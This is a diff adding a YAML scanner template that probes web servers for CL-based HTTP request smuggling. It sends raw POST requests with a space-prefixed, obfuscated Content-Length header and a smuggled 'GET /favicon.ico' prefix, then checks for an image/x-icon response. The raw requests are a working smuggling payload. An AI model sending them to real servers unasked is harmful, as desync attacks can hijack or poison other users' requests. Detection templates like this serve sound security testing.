@@ -1,0 +1,93 @@
+id: CL-Request-smuggling-prefix1
+info:
+  name: CL name prefix1
+  author: charan
+  severity: high
+  reference: https://portswigger.net/research/how-to-turn-security-research-into-profit
+
+http:
+  - raw:
+    - |+
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate
+      Accept: */*, text/smuggle
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+      Connection: keep-alive
+      Cache-Control: max-age=0
+      Content-Type: application/x-www-form-urlencoded
+      Foo: bar
+       Content-Length: 36
+
+      GET /favicon.ico HTTP/1.1
+      X-YzBqv:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+      Connection: keep-alive
+      Cache-Control: max-age=0
+      Content-Type: application/x-www-form-urlencoded
+      Foo: bar
+       Content-Length: 36
+
+      GET /favicon.ico HTTP/1.1
+      X-YzBqv:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+      Connection: keep-alive
+      Cache-Control: max-age=0
+      Content-Type: application/x-www-form-urlencoded
+      Foo: bar
+       Content-Length: 36
+
+      GET /favicon.ico HTTP/1.1
+      X-YzBqv:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+      Connection: keep-alive
+      Cache-Control: max-age=0
+      Content-Type: application/x-www-form-urlencoded
+      Foo: bar
+       Content-Length: 36
+
+      GET /favicon.ico HTTP/1.1
+      X-YzBqv:
+    - |+
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate
+      Accept: */*, text/smuggle
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(all_headers, "image/x-icon")'
